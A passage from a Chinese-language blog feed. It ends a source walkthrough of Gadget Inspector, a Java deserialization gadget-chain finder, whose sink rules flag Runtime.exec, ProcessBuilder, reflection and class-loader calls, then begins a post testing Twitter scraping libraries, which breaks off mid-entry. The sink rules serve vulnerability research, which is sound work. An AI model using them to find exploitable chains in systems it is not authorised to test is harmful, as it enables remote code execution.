class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/nio/file/Files&quot;</span>)</span><br><span class="line">            &amp;&amp; (method.getName().equals(<span class="string">&quot;newInputStream&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newOutputStream&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newBufferedReader&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newBufferedWriter&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Runtime&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    if (method.getClassReference().getName().equals(&quot;java/lang/Class&quot;)</span></span><br><span class="line"><span class="comment">            &amp;&amp; method.getName().equals(&quot;forName&quot;)) &#123;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if (method.getClassReference().getName().equals(&quot;java/lang/Class&quot;)</span></span><br><span class="line"><span class="comment">            &amp;&amp; method.getName().equals(&quot;getMethod&quot;)) &#123;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// If we can invoke an arbitrary method, that&#x27;s probably interesting (though this doesn&#x27;t assert that we</span></span><br><span class="line">    <span class="comment">// can control its arguments). Conversely, if we can control the arguments to an invocation but not what</span></span><br><span class="line">    <span class="comment">// method is being invoked, we don&#x27;t mark that as interesting.</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/reflect/Method&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;invoke&quot;</span>) &amp;&amp; argIndex == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/net/URLClassLoader&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;newInstance&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/System&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Shutdown&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Runtime&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/nio/file/Files&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;newOutputStream&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/ProcessBuilder&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>) &amp;&amp; argIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;java/lang/ClassLoader&quot;</span>))</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/net/URL&quot;</span>) &amp;&amp; method.getName().equals(<span class="string">&quot;openStream&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Some groovy-specific sinks</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/codehaus/groovy/runtime/InvokerHelper&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;invokeMethod&quot;</span>) &amp;&amp; argIndex == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;groovy/lang/MetaClass&quot;</span>))</span><br><span class="line">            &amp;&amp; Arrays.asList(<span class="string">&quot;invokeMethod&quot;</span>, <span class="string">&quot;invokeConstructor&quot;</span>, <span class="string">&quot;invokeStaticMethod&quot;</span>).contains(method.getName())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This jython-specific sink effectively results in RCE</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/python/core/PyCode&quot;</span>) &amp;&amp; method.getName().equals(<span class="string">&quot;call&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>printGadgetChain</code> 方法用于输出利用链信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将利用链写入文件：（缩进）类名 方法名 方法描述符 传递污点的参数索引</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> writer 写入流</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> chain  利用链</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printGadgetChain</span><span class="params">(Writer writer, GadgetChain chain)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    writer.write(String.format(<span class="string">&quot;%s.%s%s (%d)%n&quot;</span>,    <span class="comment">// 污点源</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).method.getClassReference().getName(),    <span class="comment">// 类名</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).method.getName(),    <span class="comment">// 方法名</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).method.getDesc(),    <span class="comment">// 描述符</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).taintedArgIndex));   <span class="comment">// 污点参数索引</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; chain.links.size(); i++) &#123;  <span class="comment">// 利用链</span></span><br><span class="line">        writer.write(String.format(<span class="string">&quot;  %s.%s%s (%d)%n&quot;</span>,</span><br><span class="line">                chain.links.get(i).method.getClassReference().getName(),</span><br><span class="line">                chain.links.get(i).method.getName(),</span><br><span class="line">                chain.links.get(i).method.getDesc(),</span><br><span class="line">                chain.links.get(i).taintedArgIndex));</span><br><span class="line">    &#125;</span><br><span class="line">    writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 结语"></a>0x04 结语</h1><p>测试时发现 Gadget Inspector 无法分析用 Java16 生成的 jar 包，听说 Java8 的兼容性比较好，尝试使用 Java8 打包，可以正常执行分析，之后再补充例子。</p><p>这个工具很明显无法搜索所有的利用链，为了避免路径爆炸对每个方法只访问一次，可以用最大深度限制修改；另外也有文章分析表示生成的调用关系不够全，我没有验证过；扩充的话可以从添加 source&#x2F;sink 点（规则）开始，也有人扩充了对 SQL 注入（Web）的检测之类的。</p><p>当然还是先熟悉工具的运行原理，用简单的程序测试之后，再拿实际例子（比如 ysoserial）测，难顶🤯。</p><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html">字节码增强技术探索</a></li><li><a href="https://zhuanlan.zhihu.com/p/45354152">Java虚拟机—栈帧、操作数栈和局部变量表</a></li><li><a href="https://docs.oracle.com/javase/specs/index.html">Java Language and Virtual Machine Specifications</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/ClassReader.html">Class ClassReader</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/ClassVisitor.html">Class ClassVisitor</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/MethodVisitor.html">Class MethodVisitor</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/FieldVisitor.html">Class FieldVisitor</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/commons/JSRInlinerAdapter.html">Class JSRInlinerAdapter</a></li><li><a href="https://paper.seebug.org/1034/">Java 反序列化工具 gadgetinspector 初窥</a></li><li><a href="http://galaxylab.pingan.com.cn/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7%E4%B9%8B-gadgetinspector/">Java反序列化漏洞辅助工具之 gadgetinspector</a></li><li><a href="https://threedr3am.github.io/2020/01/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7gadgetinspector%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">java反序列化利用链自动挖掘工具gadgetinspector源码浅析</a></li></ul>]]></content>
    
    
    <summary type="html">感觉自己看了好久好久... 长文警告⚠️</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Python 爬取 twitter 数据</title>
    <link href="https://jckling.github.io/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/"/>
    <id>https://jckling.github.io/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/</id>
    <published>2021-10-11T10:44:50.000Z</published>
    <updated>2022-04-26T07:43:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>接到一个需求：爬包含关键字的推文。后来才告诉我转交给别人做了（摊手），那这里就分享一下如何爬取 twitter 数据。<br><em>结果我拖了两周才开始梳理</em> 😂</p><h1 id="Twitter-API"><a href="#Twitter-API" class="headerlink" title="Twitter API"></a>Twitter API</h1><p>推特提供了 Twitter API，可以用于查询推特数据，个人使用的话有以下两种：</p><ol><li>Twitter API v2</li><li>Standard v1.1</li></ol><p>当然还有高级版和企业版：</p><ol><li>Premium v1.1</li><li>Enterprise</li></ol><p>标准版仅支持搜索 7 天内的推特，其余都支持全搜索（从 2006.03 开始），官方给出了比较：<a href="https://developer.twitter.com/en/docs/twitter-api/tweets/search/migrate">Comparing Twitter API’s Search Tweets endpoints</a> 。</p><p>使用标准版需要申请开发者账户<a href="https://developer.twitter.com/en/apply/user.html">Apply for a developer account</a>，使用 v2 版本的需要申请 <a href="https://developer.twitter.com/en/products/twitter-api/academic-research">Academic Research product track</a>。我试了申请开发者账户，然后妥妥地被拒绝了，有人说需要美国账户&#x2F;手机号之类的信息，因为不想拿自用的推特瞎测试，也就罢了。</p><img src="https://i.loli.net/2021/10/11/YouCXye5JHLgNDZ.png" width="85%"><p>这里的目标是搜索特定时间范围内，包含特定关键词的 tweets（即，推文），因此就算申请到了也不能满足需求，转而寻求开源解决方案。</p><h1 id="开源解决方案"><a href="#开源解决方案" class="headerlink" title="开源解决方案"></a>开源解决方案</h1><p>搜索 GitHub 上爬取 twitter 数据的开源项目，筛选出以下 9 个试用（按 star 数量排列）：</p><table><thead><tr><th>名称</th><th>star</th><th>最后一次更新</th><th>是否可用</th></tr></thead><tbody><tr><td><a href="https://github.com/twintproject/twint">twint</a></td><td>13k</td><td>2021.03.03</td><td>❌</td></tr><tr><td><a href="https://github.com/tweepy/tweepy">tweepy</a></td><td>8.7k</td><td>2022.04.22</td><td>✔️（需要申请 Twitter API）</td></tr><tr><td><a href="https://github.com/bisguzar/twitter-scraper">twitter-scraper</a></td><td>3.2k</td><td>2021.12.18</td><td>❌</td></tr><tr><td><a href="https://github.com/taspinar/twitterscraper">twitterscraper</a></td><td>2k</td><td>2020.07.28</td><td>❌</td></tr><tr><td><a href="https://github.com/Altimis/Scweet">Scweet</a></td><td>383</td><td>2022.03.23</td><td>✔️</td></tr><tr><td><a href="https://github.com/Solin1998/SearchTT">SearchTT</a></td><td>146</td><td>2020.06.04</td><td>❌</td></tr><tr><td><a href="https://github.com/amitupreti/Hands-on-WebScraping/tree/master/project1_twitter_hashtag_crawler">Twitter Hashtag crawler</a></td><td>75</td><td>2020.12.16</td><td>❌</td></tr><tr><td><a href="https://github.com/markowanga/stweet">stweet</a></td><td>99</td><td>2021.10.14</td><td>✔️</td></tr><tr><td><a href="https://github.com/wyfok/Web_Scraping_Tweet_Traffic">Web_Scraping_Tweet_Traffic</a></td><td>6</td><td>2019.12.15</td><td>❌</td></tr></tbody></table><h2 id="twint"><a href="#twint" class="headerlink" title="twint"></a><a href="https://github.com/twintproject/twint">twint</a></h2><p>不用 Twitter API 爬取推文，支持标签、趋势、敏感信息等搜索选项，也支持爬取用户信息，包括关注者、推文。</p><ol><li><p>安装</p><p> 直接从 pypi 安装的包版本较低，需要升级</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade git+https://github.com/twintproject/twint.git@origin/master<span class="comment">#egg=twint</span></span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 配置一个代理</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> twint</span><br><span class="line"></span><br><span class="line">c = twint.Config()</span><br><span class="line">c.Proxy_host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">c.Proxy_port = <span class="string">&#x27;7890&#x27;</span></span><br><span class="line">c.Proxy_type = <span class="string">&#x27;http&#x27;</span></span><br><span class="line"></span><br><span class="line">c.Store_csv = <span class="literal">True</span></span><br><span class="line">c.Output = <span class="string">&quot;tweets.csv&quot;</span></span><br><span class="line"></span><br><span class="line">c.Limit = <span class="number">10</span></span><br><span class="line">c.Custom_query = <span class="string">&quot;nijisanji&quot;</span></span><br><span class="line"></span><br><span class="line">twint.run.Search(c)</span><br></pre></td></tr></table></figure><p> 然后挂掉</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WARNING:root:Error retrieving https://twitter.com/: ConnectTimeout(MaxRetryError(<span class="string">&quot;HTTPSConnectionPool(host=&#x27;twitter.com&#x27;, port=443): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPSConnection object at 0x000001D2C5A295B0&gt;, &#x27;Connection to twitter.com timed out. (connect timeout=10)&#x27;))&quot;</span>)), retrying</span><br></pre></td></tr></table></figure><p> 翻了翻 issue 有人在二月份修复了：<a href="https://github.com/twintproject/twint/pull/1138">Fix the bug that proxy cannot be used when get token #1138</a>，但没有合并。</p><p> 顺便发现有人提设置时间范围的 <code>since</code> 和 <code>until</code> 失效了</p><ul><li><a href="https://github.com/twintproject/twint/issues/1281">c.Since and c.Until not getting all tweets #1281</a></li><li><a href="https://github.com/twintproject/twint/issues/1261">Since~Until doesn’t work anymore #1261</a></li></ul></li><li><p>总结</p><p> 自己试着修改或者等一个大更新，四百多的 issue 看来是没有太多的精力修啊😅</p></li></ol><h2 id="tweepy"><a href="#tweepy" class="headerlink" title="tweepy"></a><a href="https://github.com/tweepy/tweepy">tweepy</a></h2><p>实际上就是对 twitter API 的封装，不用从零手写请求和处理数据。</p><ol><li><p>安装</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tweepy</span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 没有申请到开发者账户，跳过！</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tweepy</span><br><span class="line"></span><br><span class="line">auth = tweepy.OAuthHandler(consumer_key, consumer_secret)</span><br><span class="line">auth.set_access_token(access_token, access_token_secret)</span><br><span class="line"></span><br><span class="line">api = tweepy.API(auth)</span><br><span class="line"></span><br><span class="line">public_tweets = api.home_timeline()</span><br><span class="line"><span class="keyword">for</span> tweet <span class="keyword">in</span> public_tweets:</span><br><span class="line">    <span class="built_in">print</span>(tweet.text)</span><br></pre></td></tr></table></figure></li><li><p>总结</p><p> Twitter API v2 的支持还在开发中，申请到开发者账户的就用它吧！</p></li></ol><h2 id="twitter-scraper"><a href="#twitter-scraper" class="headerlink" title="twitter-scraper"></a><a href="https://github.com/bisguzar/twitter-scraper">twitter-scraper</a></h2><p>支持标签、趋势等搜索选项，也支持用户信息的搜索。</p><ol><li><p>安装</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install twitter_scraper</span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 因为没有提供设值代理的选项，所以直接在本地开全局模式代理</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twitter_scraper <span class="keyword">import</span> get_tweets</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tweet <span class="keyword">in</span> get_tweets(<span class="string">&#x27;twitter&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(tweet[<span class="string">&#x27;text&#x27;</span>])</span><br></pre></td></tr></table></figure><p> 报错😅</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ProxyError: HTTPSConnectionPool(host=<span class="string">&#x27;twitter.com&#x27;</span>, port=443): Max retries exceeded with url: /i/profiles/show/twitter/timeline/tweets?include_available_features=1&amp;include_entities=1&amp;include_new_items_bar=<span class="literal">true</span> (Caused by ProxyError(<span class="string">&#x27;Cannot connect to proxy.&#x27;</span>, OSError(0, <span class="string">&#x27;Error&#x27;</span>)))</span><br></pre></td></tr></table></figure><p> 改下源码，报错在 tweets.py 这个文件，添加代理</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_tweets</span>(<span class="params">query, pages=<span class="number">25</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_tweets</span>(<span class="params">pages</span>):</span><br><span class="line">        proxy = <span class="string">&#x27;http://127.0.0.1:7890&#x27;</span></span><br><span class="line">        r = session.get(url, headers=headers, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: proxy, <span class="string">&#x27;https&#x27;</span>: proxy&#125;)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p> 重新执行，新的报错😅</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)</span><br></pre></td></tr></table></figure></li><li><p>总结</p><p> 作者说现在已经无法使用了（<a href="https://github.com/bisguzar/twitter-scraper/issues/191">Does this work? #191</a>），而且自己忙于工作暂时没时间更新（<a href="https://github.com/bisguzar/twitter-scraper/issues/189#issuecomment-832690515">Doesn’t scrap anything. #189</a>），暂且观望吧。</p></li></ol><h2 id="twitterscraper"><a href="#twitterscraper" class="headerlink" title="twitterscraper"></a><a href="https://github.com/taspinar/twitterscraper">twitterscraper</a></h2><p>所以为什么要起一样的名字？！</p><ol><li><p>安装</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install twitterscraper</span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 直接上命令行了，但是无法访问默认代理 <a href="https://free-proxy-list.net/">https://free-proxy-list.net</a></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twitterscraper Trump --<span class="built_in">limit</span> 1000 --output=tweets.json</span><br></pre></td></tr></table></figure><p> 报错</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ConnectionError: HTTPSConnectionPool(host=<span class="string">&#x27;free-proxy-list.net&#x27;</span>, port=443): Max retries exceeded with url: / (Caused by NewConnectionError(<span class="string">&#x27;&lt;urllib3.connection.HTTPSConnection object at 0x0000019FAE33BDC0&gt;: Failed to establish a new connection: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。&#x27;</span>))</span><br></pre></td></tr></table></figure><p> 修改源码 query.py，直接返回本地代理</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_proxies</span>():</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;127.0.0.1:7890&#x27;</span>]</span><br><span class="line">    response = requests.get(PROXY_URL)</span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    table = soup.find(<span class="string">&#x27;table&#x27;</span>,<span class="built_in">id</span>=<span class="string">&#x27;proxylisttable&#x27;</span>)</span><br><span class="line">    list_tr = table.find_all(<span class="string">&#x27;tr&#x27;</span>)</span><br><span class="line">    list_td = [elem.find_all(<span class="string">&#x27;td&#x27;</span>) <span class="keyword">for</span> elem <span class="keyword">in</span> list_tr]</span><br><span class="line">    list_td = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="literal">None</span>, list_td))</span><br><span class="line">    list_ip = [elem[<span class="number">0</span>].text <span class="keyword">for</span> elem <span class="keyword">in</span> list_td]</span><br><span class="line">    list_ports = [elem[<span class="number">1</span>].text <span class="keyword">for</span> elem <span class="keyword">in</span> list_td]</span><br><span class="line">    list_proxies = [<span class="string">&#x27;:&#x27;</span>.join(elem) <span class="keyword">for</span> elem <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">zip</span>(list_ip, list_ports))]</span><br><span class="line">    <span class="keyword">return</span> list_proxies               </span><br></pre></td></tr></table></figure><p> 输出请求参数，然后报错…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">INFO:twitterscraper:queries: [<span class="string">&#x27;Trump since:2006-03-21 until:2006-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2006-12-30 until:2007-10-10&#x27;</span>, <span class="string">&#x27;Trump since:2007-10-10 until:2008-07-20&#x27;</span>, <span class="string">&#x27;Trump since:2008-07-20 until:2009-04-30&#x27;</span>, <span class="string">&#x27;Trump since:2009-04-30 until:2010-02-08&#x27;</span>, <span class="string">&#x27;Trump since:2010-02-08 until:2010-11-19&#x27;</span>, <span class="string">&#x27;Trump since:2010-11-19 until:2011-08-31&#x27;</span>, <span class="string">&#x27;Trump since:2011-08-31 until:2012-06-10&#x27;</span>, <span class="string">&#x27;Trump since:2012-06-10 until:2013-03-21&#x27;</span>, <span class="string">&#x27;Trump since:2013-03-21 until:2013-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2013-12-30 until:2014-10-10&#x27;</span>, <span class="string">&#x27;Trump since:2014-10-10 until:2015-07-21&#x27;</span>, <span class="string">&#x27;Trump since:2015-07-21 until:2016-04-30&#x27;</span>, <span class="string">&#x27;Trump since:2016-04-30 until:2017-02-09&#x27;</span>, <span class="string">&#x27;Trump since:2017-02-09 until:2017-11-20&#x27;</span>, <span class="string">&#x27;Trump since:2017-11-20 until:2018-08-31&#x27;</span>, <span class="string">&#x27;Trump since:2018-08-31 until:2019-06-11&#x27;</span>, <span class="string">&#x27;Trump since:2019-06-11 until:2020-03-21&#x27;</span>, <span class="string">&#x27;Trump since:2020-03-21 until:2020-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2020-12-30 until:2021-10-11&#x27;</span>]</span><br><span class="line">ConnectionError HTTPSConnectionPool(host=<span class="string">&#x27;twitter.com&#x27;</span>, port=443): Max retries exceeded with url: /search?f=tweets&amp;vertical=default&amp;q=Trump%20since%3A2006-03-21%20until%3A2006-12-30&amp;l=None (Caused by NewConnectionError(<span class="string">&#x27;&lt;urllib3.connection.HTTPSConnection object at 0x000002975B91D430&gt;: Failed to establish a new connection: [WinError 10060] 由于连接方在一段时间</span></span><br><span class="line"><span class="string">后没有正确答复或连接的主机没有反应，连接尝试失败。&#x27;</span>)) <span class="keyword">while</span> requesting <span class="string">&quot;https://twitter.com/search?f=tweets&amp;vertical=defa</span></span><br><span class="line"><span class="string">ult&amp;q=Trump%20since%3A2006-03-21%20until%3A2006-12-30&amp;l=None&quot;</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\connection.py&quot;</span>, line 174, <span class="keyword">in</span> _new_conn</span><br><span class="line">    conn = connection.create_connection(</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\util\connection.py&quot;</span>, line 96, <span class="keyword">in</span> create_connection</span><br><span class="line">    raise err</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\util\connection.py&quot;</span>, line 86, <span class="keyword">in</span> create_connection</span><br><span class="line">    sock.connect(sa)</span><br><span class="line">TimeoutError: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。</span><br></pre></td></tr></table></figure></li><li><p>总结 </p><p> 翻了翻 issue：没法用，等更新。</p></li></ol><h2 id="Scweet"><a href="#Scweet" class="headerlink" title="Scweet"></a><a 